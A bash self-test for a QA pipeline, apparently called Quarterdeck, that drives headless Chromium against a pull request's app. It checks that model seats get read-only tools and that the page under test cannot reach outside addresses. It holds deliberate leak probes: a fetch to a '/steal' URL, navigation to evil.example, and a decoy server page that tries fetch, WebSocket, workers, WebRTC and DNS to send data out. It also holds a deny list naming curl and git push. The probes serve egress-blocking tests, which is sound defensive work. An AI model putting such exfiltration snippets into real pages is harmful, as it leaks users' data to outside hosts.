#!/bin/bash
# The pilot builds a pull request's head, starts the app, has three QA seats write plans, and has the HARNESS drive a
# headless browser through them. This runs the whole duty in a throwaway Quarterdeck against stand-ins for the model and
# gh and a real git repository of invented files. Browser checks run for real when this machine has playwright and a
# browser; when it has not, they are skipped and said so, never counted as passed.
source "$(dirname "${BASH_SOURCE[0]}")/selftest-lib.sh"
st_init pilot
st_repo
# The app: one page that shows a greeting, a button that reveals a total, and a call to an outside address that
# must be refused (it writes "blocked" when the network call fails).
APP='<!doctype html><html><body><h1 id="hi">Hello pilot</h1><button id="go" onclick="document.getElementById(&#39;total&#39;).textContent=&#39;Total 42.00&#39;">Add</button>
<p id="total"></p><p id="net">pending</p>
<script>fetch("http://203.0.113.9/steal").then(function(){document.getElementById("net").textContent="reached"}).catch(function(){document.getElementById("net").textContent="blocked"})</script></body></html>'
PR_TITLE="Show the total" PR_BODY="Fixes #7" st_pr 1 feat-total index.html "$APP"
MARK="pilot-selftest-$$"
st_registry '["pilot"]' "$(jq -nc --arg m "$MARK" '{qa:{start:("python3 -m http.server \"$PORT\" --bind 127.0.0.1 # " + $m), ready:"/"}}')"
export QUARTERDECK_QA_READY_WAIT=15 QUARTERDECK_QA_TIMEOUT=120
# On real Linux the browser must reach the app the duty starts: the owner's opt-in (see the Linux checks below and SECURITY.md).
[ "$(uname -s)" = Linux ] && export QUARTERDECK_APP_NET=share

GOOD='PLAN_JSON: [{"title":"Add shows a total","touches":["index.html"],"steps":[{"op":"goto","path":"/"},{"op":"click","selector":"#go"},{"op":"expect_text","text":"Total 42.00"}]}]
ADR: searched none
RESULT: PLAN 1 flow(s)'
BAD='PLAN_JSON: [{"title":"Total shows tax","touches":["index.html"],"steps":[{"op":"goto","path":"/"},{"op":"click","selector":"#go"},{"op":"expect_text","text":"Tax included"}]}]
ADR: searched none
RESULT: PLAN 1 flow(s)'
NET='PLAN_JSON: [{"title":"Outside calls are refused","touches":["index.html"],"steps":[{"op":"goto","path":"/"},{"op":"expect_text","selector":"#net","text":"blocked"}]}]
ADR: searched none
RESULT: PLAN 1 flow(s)'

# ---- what needs no browser ------------------------------------------------------------------------------------
st_registry '["pilot"]' '{}'
st_duty pilot --pr 1
ck "no qa.start in the registry: BLOCKED with the reason, nothing recorded as a pass" '[ "$(last_verdict)" = BLOCKED ] && grep -q "qa.start" <<<"$(last_detail)"'
ck "  and no model was asked" '[ ! -s "$T/claude-calls" ]'
st_registry '["pilot"]' "$(jq -nc --arg m "$MARK" '{qa:{start:("sleep 30 # " + $m), ready:"/"}}')"
QUARTERDECK_QA_READY_WAIT=2 st_duty pilot --pr 1
ck "an app that never answers its port is BLOCKED after the wait" '[ "$(last_verdict)" = BLOCKED ] && grep -q "did not answer" <<<"$(last_detail)"'
ck "  and nothing it started is left running" 'st_gone "$MARK"'
ck "  and no model was asked" '[ ! -s "$T/claude-calls" ]'
st_registry '["pilot"]' "$(jq -nc --arg m "$MARK" '{qa:{start:("python3 -m http.server \"$PORT\" --bind 127.0.0.1 # " + $m), ready:"/"}}')"

# ---- Linux: the app is started in its own network namespace unless the owner opted in (QUARTERDECK_APP_NET=share) -------------------------------
# Faked on any machine: `uname` says Linux (exported to the duty) and bwrap is a stand-in that records each call and runs the command unconfined.
mkdir -p "$T/lxbin"; cat > "$T/lxbin/bwrap" <<'BW'
#!/bin/bash
case "$*" in *" true") exit 0 ;; esac
printf '%s\n' "$*" >> "$(dirname "$0")/bwrap.log"; while [ "$1" != -- ]; do shift; done; shift; exec "$@"
BW
chmod +x "$T/lxbin/bwrap"
lxduty() { ( uname() { echo Linux; }; export -f uname; export QUARTERDECK_BWRAP="$T/lxbin/bwrap"; "$@" ) }
rm -f "$T/lxbin/bwrap.log"; st_noreplies; st_reply default "$GOOD"
( unset QUARTERDECK_APP_NET; lxduty st_duty pilot --pr 1; echo "$(last_verdict)|$(last_detail)" > "$T/lxout" )
ck "on Linux without QUARTERDECK_APP_NET=share the app is not started: BLOCKED with the reason and the opt-in" 'grep -qF "BLOCKED|#1 — the Linux sandbox cannot let a browser reach an app without giving the app the network; set QUARTERDECK_APP_NET=share to allow it for this machine" "$T/lxout"'
ck "  refused before anything ran: no build, no app, no model" '[ ! -e "$T/lxbin/bwrap.log" ] && st_gone "$MARK" && [ ! -s "$T/claude-calls" ]'
# with the opt-in, the app is started through bwrap with the host network shared, and the stand-in driver reaches it
PR_TITLE="Pages" st_pr 4 feat-lx app/page.tsx x
st_noreplies; st_reply default 'PLAN_JSON: [{"title":"home","touches":["app/page.tsx"],"steps":[{"op":"goto","path":"/"},{"op":"expect_text","text":"x"}]}]
ADR: searched none
RESULT: PLAN 1 flow(s)'
cat > "$T/lxbrowse.mjs" <<'JS'
import fs from "node:fs";
const [mode, file] = process.argv.slice(2);
if (mode === "shoot") console.log(JSON.stringify({ shots: [] }));
else { const p = JSON.parse(fs.readFileSync(file, "utf8")); console.log(JSON.stringify(mode === "check" ? { valid: p.flows, errors: [] } : { flows: p.flows.map(f => ({ ...f, ok: true })) })); }
JS
QUARTERDECK_APP_NET=share QUARTERDECK_BROWSE="$T/lxbrowse.mjs" lxduty st_duty pilot --pr 4 --apply
ck "on Linux with QUARTERDECK_APP_NET=share the app is started through bwrap with --share-net, and the run goes on (PASSED)" '[ "$(last_verdict)" = PASSED ] && grep -- "--share-net" "$T/lxbin/bwrap.log" | grep -q "http.server" && grep -- "--unshare-all" "$T/lxbin/bwrap.log" | grep -q "http.server"'
git -C "$T/work" checkout -q main

# the plan format is checked by the harness before anything is driven
printf '%s' '{"base":"http://127.0.0.1:1","flows":[
 {"title":"fine","steps":[{"op":"goto","path":"/a"},{"op":"expect_text","text":"x"}]},
 {"title":"offsite","steps":[{"op":"goto","path":"http://evil.example/"},{"op":"expect_text","text":"x"}]},
 {"title":"protocol relative","steps":[{"op":"goto","path":"//evil.example/"},{"op":"expect_text","text":"x"}]},
 {"title":"unknown op","steps":[{"op":"eval","code":"1"},{"op":"expect_text","text":"x"}]},
 {"title":"expects nothing","steps":[{"op":"goto","path":"/"}]},
 {"title":"too many","steps":'"$(jq -nc '[range(0;30)|{op:"wait",ms:1}]')"'},
 {"title":"long wait","steps":[{"op":"wait","ms":99999},{"op":"expect_text","text":"x"}]}]}' > "$T/plan.json"
chk=$(node "$T/bin/browse.mjs" check "$T/plan.json")
ck "the driver accepts only plain steps on the app's own paths, and refuses the rest" \
   '[ "$(jq ".valid | length" <<<"$chk")" = 1 ] && [ "$(jq -r ".valid[0].title" <<<"$chk")" = fine ] && [ "$(jq ".errors | length" <<<"$chk")" = 6 ]'
ck "  a flow that expects nothing is refused as proving nothing" 'jq -r ".errors[]" <<<"$chk" | grep -q "proves nothing"'

# ---- round 5 H2: the page under check cannot open a WebSocket to another address, and the browser keeps its own sandbox ----------------------
ck "H2 the driver closes every WebSocket that is not to the app's own address, and launches Chromium with its renderer sandbox on" 'grep -q "routeWebSocket" "$REAL/bin/browse.mjs" && grep -q "chromiumSandbox: true" "$REAL/bin/browse.mjs"'
ck "M4 the driver launches Chromium behind a dead proxy with only the app bypassing it, no name lookups, and no WebRTC UDP outside the proxy" '( for f in "--proxy-server=" "--proxy-bypass-list=<-loopback>;" "--host-resolver-rules=MAP \* ~NOTFOUND , EXCLUDE" "--webrtc-ip-handling-policy=disable_non_proxied_udp" "serviceWorkers: \"block\""; do grep -q -e "$f" "$REAL/bin/browse.mjs" || exit 1; done )'
if st_have_browser; then
  WSP=$(python3 -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1",0)); print(s.getsockname()[1]); s.close()')
  WSE=$(python3 -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1",0)); print(s.getsockname()[1]); s.close()')
  # #115 M4: the app's page tries every way out it has to a decoy on a second loopback port (TCP and UDP): fetch, img, preconnect,
  # a 302 from the app itself to the decoy (round 7 M3: route() sees only the first URL), WebSocket, a dedicated, shared and service worker, WebRTC with the decoy as STUN and TURN server, and a name lookup
  # (fetch and dns-prefetch of a made-up name). The decoy must receive nothing, and Chromium's own network log must show no name lookup.
  cat > "$T/wssrv.py" <<'PY'
import http.server, socketserver, sys, threading, socket
APP, EVIL, LOG = int(sys.argv[1]), int(sys.argv[2]), sys.argv[3]
E = f"127.0.0.1:{EVIL}"
page = f"""<html><head><link rel="dns-prefetch" href="//dns-canary-m4.example"><link rel="preconnect" href="http://{E}"></head>
<body><h1>hello app</h1><img src="http://{E}/img-leak"><img src="/r?img"><script>
fetch('/r?fetch').catch(function(){{}});
try{{new WebSocket('ws://{E}/ws-leak?d=DECOY')}}catch(e){{}}
fetch('http://{E}/fetch-leak?d=DECOY').catch(function(){{}});
fetch('http://localhost:{EVIL}/localhost-leak').catch(function(){{}});
fetch('http://dns-canary-m4.example/name-leak').catch(function(){{}});
try{{new Worker('/w.js?dedicated')}}catch(e){{}}
try{{new SharedWorker('/w.js?shared')}}catch(e){{}}
try{{navigator.serviceWorker.register('/w.js?service').catch(function(){{}})}}catch(e){{}}
try{{var pc=new RTCPeerConnection({{iceServers:[{{urls:'stun:{E}'}},{{urls:['turn:{E}?transport=udp','turn:{E}?transport=tcp'],username:'u',credential:'p'}}]}});
pc.createDataChannel('x');pc.createOffer().then(function(o){{return pc.setLocalDescription(o)}})}}catch(e){{}}
</script></body></html>"""
worker = f"""fetch('http://{E}/worker-fetch').catch(function(){{}});try{{new WebSocket('ws://{E}/worker-ws')}}catch(e){{}}
try{{var pc=new RTCPeerConnection({{iceServers:[{{urls:'stun:{E}'}}]}});pc.createDataChannel('x');pc.createOffer().then(function(o){{return pc.setLocalDescription(o)}})}}catch(e){{}}"""
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(s):
        if s.path.startswith("/r"):   # round 7 M3: route() sees only the first URL of a redirect
            s.send_response(302); s.send_header("location", f"http://{E}/redirect-leak?d=DECOY"); s.end_headers(); return
        js = s.path.startswith("/w.js"); s.send_response(200); s.send_header("content-type", "text/javascript" if js else "text/html"); s.end_headers()
        s.wfile.write((worker if js else page).encode())
    def log_message(*a): pass
def tcp():
    ls = socket.socket(); ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1); ls.bind(("127.0.0.1", EVIL)); ls.listen(5)
    while True:
        c, _ = ls.accept(); c.settimeout(1)
        try: d = c.recv(2000).split(b"\r\n")[0]
        except Exception: d = b""
        open(LOG, "ab").write(b"tcp " + d + b"\n"); c.close()
def udp():
    us = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); us.bind(("127.0.0.1", EVIL))
    while True: us.recvfrom(4000); open(LOG, "ab").write(b"udp datagram\n")
threading.Thread(target=tcp, daemon=True).start(); threading.Thread(target=udp, daemon=True).start()
socketserver.TCPServer(("127.0.0.1", APP), H).serve_forever()
PY
  : > "$T/ws-evil.log"; python3 "$T/wssrv.py" "$WSP" "$WSE" "$T/ws-evil.log" & WSPID=$!; sleep 1
  printf '{"base":"http://127.0.0.1:%s","flows":[{"title":"t","steps":[{"op":"goto","path":"/"},{"op":"wait","ms":3000},{"op":"expect_text","text":"hello"}]},{"title":"redirect","steps":[{"op":"goto","path":"/r?goto"},{"op":"wait","ms":1000},{"op":"expect_text","text":"x"}]}]}' "$WSP" > "$T/wsplan.json"
  wsout=$(QUARTERDECK_BROWSE_NETLOG="$T/netlog.json" node "$T/bin/browse.mjs" run "$T/wsplan.json" "$T/wsout" 2>&1)
  kill "$WSPID" 2>/dev/null; wait "$WSPID" 2>/dev/null
  ck "H2/M4 a page that tries fetch, img, preconnect, a redirect from the app (page, img, fetch), WebSocket, workers and WebRTC to another loopback port reaches none of them (TCP or UDP), and the flow still runs" '[ ! -s "$T/ws-evil.log" ] && jq -e ".flows[0].ok == true" <<<"$wsout" >/dev/null || { cat "$T/ws-evil.log"; echo "$wsout" | head -c 400; false; }'
  ck "M4 no name at all was looked up while the page ran, the page's or Chromium's own (Chromium's network log)" 'python3 - "$T/netlog.json" <<"PY"
import json, sys
raw = open(sys.argv[1]).read().rstrip().rstrip(",")
d = json.loads(raw if raw.endswith("}") else raw + "]}")
kind = {v: k for k, v in d["constants"]["logEventTypes"].items()}
seen = [kind[e["type"]] + " " + json.dumps(e.get("params", {}))[:120] for e in d["events"] if kind[e["type"]] in ("DNS_TRANSACTION_QUERY", "HOST_RESOLVER_SYSTEM_TASK", "HOST_RESOLVER_DNS_TASK")]
print("\n".join(seen[:5])); sys.exit(1 if seen else 0)
PY'
else
  st_skip_browser "the H2 live WebSocket check did not run"
fi

# route choice is a pure function: no browser needed
ck "bin/routes.py derives same-origin routes (router files, sitemap, home links, diff), caps them, and drops external, dynamic and api ones" 'python3 "$REAL/bin/routes.py" | grep -q "routes.py: ok"'

# The first screen is looked at before any seat is asked, so every check from here on needs a browser.
if st_have_browser; then
# ---- unparseable replies write nothing ----------------------------------------------------------------------
st_noreplies; st_reply default 'I think the app works fine. No plan.'
st_duty pilot --pr 1 --apply
ck "an unparseable reply from every seat is an ERROR run" '[ "$(last_verdict)" = ERROR ]'
ck "  and writes nothing: no document, no findings file" '[ -z "$(ls "$T"/workspace/*pilot*.md 2>/dev/null)" ] && [ -z "$(ls "$T"/state/findings 2>/dev/null)" ]'
ck "  and nothing was written to GitHub" 'no_gh_writes'
ck "  and the app it started is gone" 'st_gone "$MARK"'

# ---- the model is read only; the plan is the whole of what it contributes -----------------------------------
st_noreplies; st_reply default "$GOOD"
st_duty pilot --pr 1
first=$(head -1 "$T/claude-calls")
ck "every seat is asked with read-only tools and the deny list that blocks writes and publishing" \
   'jq -e ".deny | contains(\"Write\") and contains(\"Edit\") and contains(\"Bash(git push\") and contains(\"Bash(gh pr comment\") and contains(\"Bash(curl\")" <<<"$first" >/dev/null && ! jq -r .allow <<<"$first" | grep -Eq "Edit|Write|Bash\(gh pr (create|comment|merge)"'
ck "  the three QA seats were each asked, from the crew files" '[ "$(wc -l < "$T/claude-calls" | tr -d " ")" = 3 ] && grep -q "You are the flowpilot" "$T/claude-calls" && grep -q "You are the stormhand" "$T/claude-calls" && grep -q "You are the wakewatcher" "$T/claude-calls"'
ck "  and told to use invented data only" 'grep -q "invented data only" "$T/claude-calls"'
ck "  the project guardrails reach every seat" 'grep -q "Never touch money code" "$T/claude-calls"'

else
  st_skip_browser "the checks that need the first-screen preflight to pass did not run"
fi

if st_have_browser; then
  # ---- a passing run ---------------------------------------------------------------------------------------
  st_noreplies; st_reply default "$GOOD"
  st_duty pilot --pr 1
  ck "report only: a passing flow reports PASSED and records DRY-RUN" 'grep -q "PASSED" <<<"$OUT" && [ "$(last_verdict)" = DRY-RUN ]'
  ck "  and a report-only run writes no document and no findings file" '[ -z "$(ls "$T"/workspace/*pilot*.md 2>/dev/null)" ] && [ -z "$(ls "$T"/state/findings 2>/dev/null)" ]'
  ck "  nothing was written to GitHub" 'no_gh_writes'
  ck "  and the app it started is gone" 'st_gone "$MARK"'
  st_duty pilot --pr 1 --apply
  ck "--apply on a passing run records PASSED" '[ "$(last_verdict)" = PASSED ]'
  ck "  and writes the findings document, and only that" '[ -f "$T/workspace/tp-pilot-pr1.md" ] && grep -q "PASSED" "$T/workspace/tp-pilot-pr1.md"'
  ck "  and still writes nothing to GitHub" 'no_gh_writes'
  ck "  the report lists routes covered and not covered" 'grep -q "^Routes covered: /\. Not covered: none\.$" "$T/workspace/tp-pilot-pr1.md"'
  OFF='PLAN_JSON: [{"title":"Wanders off the list","touches":["index.html"],"steps":[{"op":"goto","path":"/not-on-the-list"},{"op":"expect_text","text":"x"}]}]
ADR: searched none
RESULT: PLAN 1 flow(s)'
  st_noreplies; st_reply default "$OFF"
  st_duty pilot --pr 1
  ck "a flow that opens a path outside the route list is refused, and with nothing left the run is an ERROR" '[ "$(last_verdict)" = ERROR ] && grep -q "not on the route list" <<<"$(last_detail)"'
  st_noreplies; st_reply default "$GOOD"
  # ---- a failing run ---------------------------------------------------------------------------------------
  st_noreplies; st_reply 'You are the stormhand' "$BAD"; st_reply default "$GOOD"
  st_duty pilot --pr 1 --apply
  ck "a failing flow records FAILED 1" '[ "$(last_verdict)" = FAILED ] && grep -q "^1 " <<<"$(last_detail)" || grep -q "1 of 3" <<<"$(last_detail)"'
  doc="$T/workspace/tp-pilot-pr1.md"
  ck "  the document has steps to reproduce" 'grep -q "Steps to reproduce" "$doc" && grep -q "Click \`#go\`" "$doc" && grep -q "Expect to see \"Tax included\"" "$doc"'
  shot=$(sed -n 's/^Screenshot: `\(.*\)`$/\1/p' "$doc" | head -1)
  ck "  and a screenshot path for the failure, that exists, under the duty's own state" '[ -s "$shot" ] && [[ "$shot" == "$T/state/pilot/"* ]]'
  ck "  and the findings file the Caulker reads names the file, the evidence and the verdict" \
     'jq -e ".duty == \"pilot\" and .pr == 1 and (.verdict | startswith(\"FAILED\")) and (.findings | length) == 1 and .findings[0].paths == [\"index.html\"] and (.findings[0].evidence | length) > 0 and (.findings[0].body | contains(\"Steps to reproduce\"))" "$T/state/findings/tp-pr1-pilot.json" >/dev/null'
  # ---- the app under check cannot call out -------------------------------------------------------------------
  st_noreplies; st_reply default "$NET"
  st_duty pilot --pr 1
  ck "the page under check cannot reach any address but its own: the outside call is refused" 'grep -q "PASSED" <<<"$OUT"'
  # ---- one run is capped --------------------------------------------------------------------------------
  many=$(jq -nc --argjson g "$(jq -nc '{title:"t",touches:["index.html"],steps:[{op:"goto",path:"/"},{op:"expect_visible",selector:"#hi"}]}')" '[range(0;8) | $g | .title = "flow \(.title)"]')
  st_noreplies; st_reply default "PLAN_JSON: $many
ADR: searched none
RESULT: PLAN 8 flow(s)"
  QUARTERDECK_MAX_ITEMS=2 st_duty pilot --pr 1 --apply
  ck "QUARTERDECK_MAX_ITEMS caps the flows each seat may bring (2 each, 6 in all)" 'grep -q "6 flow(s)" "$T/workspace/tp-pilot-pr1.md"'
else
  st_skip_browser "the browser checks did not run (they run on the Mac, and in any session with chromium)"
fi

# ---- an app that could not start properly is BLOCKED, never FAILED or PASSED --------------------------------------------------------------
screen() { printf '%s' "$1" > "$T/screen.json"; node "$T/bin/browse.mjs" screen "$T/screen.json"; }
ck "a short page that is only a configuration or error message, with no form, input or navigation, is not an app" \
   '[ "$(screen "{\"text\":\"Configuration Error: Missing Supabase environment variables\"}" | jq -r .usable)" = false ] && [ "$(screen "{\"text\":\"Something went wrong\"}" | jq -r .usable)" = false ] && [ "$(screen "{\"text\":\"Failed to fetch\"}" | jq -r .usable)" = false ] && [ "$(screen "{\"text\":\"Cannot connect to the database\"}" | jq -r .usable)" = false ] && [ "$(screen "{\"text\":\"Application error: a client-side exception has occurred\"}" | jq -r .usable)" = false ]'
ck "  the reason quotes what the screen says" 'screen "{\"text\":\"Configuration Error: Missing Supabase environment variables\"}" | jq -r .reason | grep -q "the app shows .Configuration Error: Missing Supabase environment variables. on its first screen"'
S_BLANK='{"text":""}'; S_MEDIA='{"text":"","media":1}'; S_FORM='{"text":"Something went wrong","forms":1}'; S_INPUT='{"text":"Cannot connect","inputs":1}'
S_NAV='{"text":"Failed to load","navs":1}'; S_SHORT='{"text":"Welcome back"}'; S_LONG="{\"text\":\"$(printf 'word %.0s' $(seq 1 80)) something went wrong\"}"
ck "  a blank page is not an app either, unless it holds a picture or a canvas" '[ "$(screen "$S_BLANK" | jq -r .usable)" = false ] && [ "$(screen "$S_MEDIA" | jq -r .usable)" = true ]'
ck "  the same words on a page with a form, an input or navigation are judged as an app; so is a long page, and an ordinary short one" \
   '[ "$(screen "$S_FORM" | jq -r .usable)" = true ] && [ "$(screen "$S_INPUT" | jq -r .usable)" = true ] && [ "$(screen "$S_NAV" | jq -r .usable)" = true ] && [ "$(screen "$S_SHORT" | jq -r .usable)" = true ] && [ "$(screen "$S_LONG" | jq -r .usable)" = true ]'
if st_have_browser; then
  OKPLAN='PLAN_JSON: [{"title":"Sign in is offered","touches":["index.html"],"steps":[{"op":"goto","path":"/"},{"op":"expect_text","text":"Welcome"},{"op":"expect_visible","selector":"#email"}]}]
ADR: searched none
RESULT: PLAN 1 flow(s)'
  git -C "$T/work" checkout -q main
  PR_TITLE="Needs settings" st_pr 2 feat-env ok.html '<!doctype html><html><body><p id="hi">Welcome</p><form><input id="email"><button id="go">Sign in</button></form></body></html>' \
    err.html '<!doctype html><html><body><h1>Configuration Error</h1><p>Missing Supabase environment variables</p></body></html>' index.html 'placeholder' .env 'FROM_DOTENV=1'
  ENVSTART="[ -n \"\$SUPABASE_URL\" ] && cp ok.html index.html || cp err.html index.html; env > \"$T/seen-env.txt\"; exec python3 -m http.server \"\$PORT\" --bind 127.0.0.1 # $MARK"
  st_registry '["pilot"]' "$(jq -nc --arg s "$ENVSTART" '{qa:{start:$s, ready:"/"}}')"
  st_noreplies; st_reply default "$OKPLAN"; : > "$T/claude-calls"; rm -rf "$T/state/findings" "$T/state/pilot" "$T"/workspace/*pilot*.md "$T/gh-calls"
  OWNER_SENTINEL=owner-secret-do-not-pass st_duty pilot --pr 2 --apply
  ck "an app that shows only a configuration error is BLOCKED with what it says, not FAILED and not PASSED" '[ "$(last_verdict)" = BLOCKED ] && grep -q "Missing Supabase environment variables" <<<"$(last_detail)" && ! grep -qE "FAILED|PASSED" <<<"$(last_verdict)"'
  shot=$(sed -n 's/.*(screenshot: \([^)]*\)).*/\1/p' <<<"$(last_detail)" | head -1)
  ck "  with the picture of that screen, taken by the harness under the duty's own state" '[ -s "$shot" ] && [[ "$shot" == "$T/state/pilot/"* ]]'
  ck "  before any model was asked for a plan, so nothing was spent on it, and nothing was written: no findings, no document, no GitHub" '[ ! -s "$T/claude-calls" ] && [ -z "$(ls "$T"/state/findings 2>/dev/null)" ] && [ -z "$(ls "$T"/workspace/*pilot*.md 2>/dev/null)" ] && no_gh_writes'
  ck "  and it tells the owner what to do: give the app synthetic settings in qa.env" 'grep -q "qa.env" <<<"$OUT"'
  ck "  the app ran in a clean environment: the owner's variable never reached it, nor did a .env file in the repository" '! grep -q "owner-secret-do-not-pass" "$T/seen-env.txt" && ! grep -q "FROM_DOTENV" "$T/seen-env.txt" && grep -q "^PORT=" "$T/seen-env.txt"'
  st_registry '["pilot"]' "$(jq -nc --arg s "$ENVSTART" '{qa:{start:$s, ready:"/", env:{SUPABASE_URL:"http://127.0.0.1:54321", SUPABASE_ANON_KEY:"synthetic-key", FEATURE_LEVEL:3}}}')"
  st_noreplies; st_reply default "$OKPLAN"; : > "$T/claude-calls"; rm -rf "$T/state/findings" "$T/state/pilot"
  OWNER_SENTINEL=owner-secret-do-not-pass st_duty pilot --pr 2 --apply
  ck "the same app with qa.env set renders its form and is judged normally: PASSED" '[ "$(last_verdict)" = PASSED ]'
  ck "  the qa.env values (strings and numbers) reached the app, and still nothing else of the owner's did" 'grep -q "^SUPABASE_URL=http://127.0.0.1:54321$" "$T/seen-env.txt" && grep -q "^SUPABASE_ANON_KEY=synthetic-key$" "$T/seen-env.txt" && grep -q "^FEATURE_LEVEL=3$" "$T/seen-env.txt" && ! grep -q "owner-secret-do-not-pass" "$T/seen-env.txt" && ! grep -q "FROM_DOTENV" "$T/seen-env.txt"'
  ck "  the models were asked, because there was an app to plan against" '[ "$(wc -l < "$T/claude-calls" | tr -d " ")" = 3 ]'
  # the same step failing on the first screen of an app that did render, in every flow
  NOPE='PLAN_JSON: [{"title":"Press the missing button","touches":["index.html"],"steps":[{"op":"goto","path":"/"},{"op":"click","selector":"#nope"},{"op":"expect_text","text":"x"}]}]
ADR: searched none
RESULT: PLAN 1 flow(s)'
  st_noreplies; st_reply default "$NOPE"; rm -rf "$T/state/findings" "$T/state/pilot"
  st_duty pilot --pr 2 --apply
  ck "the same step failing on the first screen in every flow is BLOCKED, not three FAILED flows" '[ "$(last_verdict)" = BLOCKED ] && grep -q "the same step fails on the first screen in every flow (click #nope)" <<<"$(last_detail)" && [ -z "$(ls "$T"/state/findings 2>/dev/null)" ]'
  st_noreplies; st_reply 'You are the stormhand' "$NOPE"; st_reply default "$OKPLAN"; rm -rf "$T/state/findings" "$T/state/pilot"
  st_duty pilot --pr 2 --apply
  ck "one flow failing while the others pass is still a real FAILED 1" '[ "$(last_verdict)" = FAILED ]'
else
  st_skip_browser "the BLOCKED-app checks did not run"
fi
# ---- route list and coverage, with a stand-in driver so no browser is needed ----------------------------------------------------
# The stand-in answers like bin/browse.mjs: shoot -> a clean first screen, check -> every flow valid, run -> every flow ok (a title with FAIL fails at step 2).
cat > "$T/fakebrowse.mjs" <<'JS'
import fs from "node:fs";
const [mode, file] = process.argv.slice(2);
if (mode === "shoot") console.log(JSON.stringify({ shots: [] }));
else {
  const p = JSON.parse(fs.readFileSync(file, "utf8"));
  if (mode === "check") console.log(JSON.stringify({ valid: p.flows, errors: [] }));
  else console.log(JSON.stringify({ flows: p.flows.map(f => /FAIL/.test(f.title) ? { ...f, ok: false, failed_step: 1, message: "stand-in failure", screenshot: "" } : { ...f, ok: true }) }));
}
JS
git -C "$T/work" checkout -q main
PR_TITLE="Pages" st_pr 3 feat-pages app/page.tsx x app/settings/page.tsx x app/billing/page.tsx x app/users/\[id\]/page.tsx x app/api/pay/route.ts x
export QUARTERDECK_BROWSE="$T/fakebrowse.mjs"
FLOW() { printf '{"title":"%s","touches":["app/settings/page.tsx"],"steps":[{"op":"goto","path":"%s"},{"op":"goto","path":"%s"},{"op":"expect_text","text":"x"}]}' "$1" "$2" "$3"; }
st_noreplies; st_reply default "PLAN_JSON: [$(FLOW "settings looks right" /settings /)]
ADR: searched none
RESULT: PLAN 1 flow(s)"
st_duty pilot --pr 3 --apply
ck "the crew is shown the route list: the routes the pull request touches come from the router files" 'grep -q "Routes you may open" "$T/claude-calls" && grep -q "/settings.n" "$T/claude-calls" && grep -q "/billing" "$T/claude-calls"'
ck "  the report says which routes were covered and which were not" 'grep -q "^Routes covered: /, /settings\. Not covered: /billing\.$" "$T/workspace/tp-pilot-pr3.md"'
ck "  and the recorded run carries the same sentence" 'grep -q "Not covered: /billing" <<<"$(last_detail)"'
st_noreplies; st_reply default "PLAN_JSON: [$(FLOW "FAIL on home" / /billing)]
ADR: searched none
RESULT: PLAN 1 flow(s)"
st_duty pilot --pr 3 --apply
ck "a failed flow covers only the steps that ran: the goto after the failed step does not count" 'grep -q "^Routes covered: /\. Not covered: .*/billing" "$T/workspace/tp-pilot-pr3.md"'
st_noreplies; st_reply default "PLAN_JSON: [$(FLOW "wanders" /settings //evil.test/x)]
ADR: searched none
RESULT: PLAN 1 flow(s)"
st_duty pilot --pr 3 --apply
ck "a goto to a path off the list is refused (here a protocol-relative address), and nothing is written" '[ "$(last_verdict)" = ERROR ] && ! grep -q "evil" "$T/workspace/tp-pilot-pr3.md" 2>/dev/null'
st_noreplies; st_reply default "PLAN_JSON: [$(FLOW "settings" /settings /)]
ADR: searched none
RESULT: PLAN 1 flow(s)"
QUARTERDECK_QA_ROUTES=1 st_duty pilot --pr 3 --apply
ck "QUARTERDECK_QA_ROUTES caps the list: with 1, only / may be opened, so a flow to /settings is refused" '[ "$(last_verdict)" = ERROR ] && grep -q "not on the route list" <<<"$(last_detail)"'
unset QUARTERDECK_BROWSE
git -C "$T/work" checkout -q main

for qe in '{"A-B":"x"}' '{"QUARTERDECK_X":"x"}' '{"PATH":"/tmp"}' '{"HOME":"/tmp"}' '{"K":{"nested":1}}' '["a"]'; do
  st_registry '["pilot"]' "$(jq -nc --argjson e "$qe" '{qa:{start:"true", env:$e}}')"
  st_noreplies; : > "$T/claude-calls"; st_duty pilot --pr 1
  QE="$qe"
  ck "a malformed qa.env ($qe) is refused: BLOCKED, no model, nothing started" '[ "$(last_verdict)" = BLOCKED ] && grep -q "qa.env in the registry is malformed" <<<"$(last_detail)" && [ ! -s "$T/claude-calls" ]'
done
# back to the registry the rest of this file uses
st_registry '["pilot"]' "$(jq -nc --arg m "$MARK" '{qa:{start:("python3 -m http.server \"$PORT\" --bind 127.0.0.1 # " + $m), ready:"/"}}')"
git -C "$T/work" checkout -q main

# ---- the browser driver is not available: BLOCKED, plainly ----------------------------------------------------
st_noreplies; st_reply default "$GOOD"
( unset NODE_PATH; QUARTERDECK_CHROMIUM=/nonexistent/chrome st_duty pilot --pr 1; echo "$(last_verdict)|$(last_detail)" > "$T/blockedout" )
ck "no usable browser: BLOCKED with the reason, not PASSED" 'grep -q "^BLOCKED|" "$T/blockedout"'
ck "  and the app it started is gone" 'st_gone "$MARK"'

# ---- structure ---------------------------------------------------------------------------------------------------
ck "the duty is read whole before it runs" 'grep -q "^# quarterdeck: read-whole-file$" "$REAL/duties/pilot.sh" && [ "$(tail -c 3 "$REAL/duties/pilot.sh" | tr -d "\n")" = "}" ]'
ck "the qa seats exist, sit on the qa panel and each has a bias and something it is willing to be wrong about" \
   '[ "$(for c in flowpilot stormhand wakewatcher; do grep -c "willing to be wrong about" "$REAL/crew/$c.md"; grep -q "^discipline: qa$" "$REAL/crew/$c.md" && grep -q "^bias: ." "$REAL/crew/$c.md"; done | grep -c 1)" = 3 ]'
ck "no new crew member is named with a word the owner ruled out" '! grep -rliE "(^|[^[:alnum:]])(tester|sentry|mender|critic|prover)([^[:alnum:]]|$)" "$REAL"/crew/flowpilot.md "$REAL"/crew/stormhand.md "$REAL"/crew/wakewatcher.md "$REAL"/duties/pilot.sh'
st_done
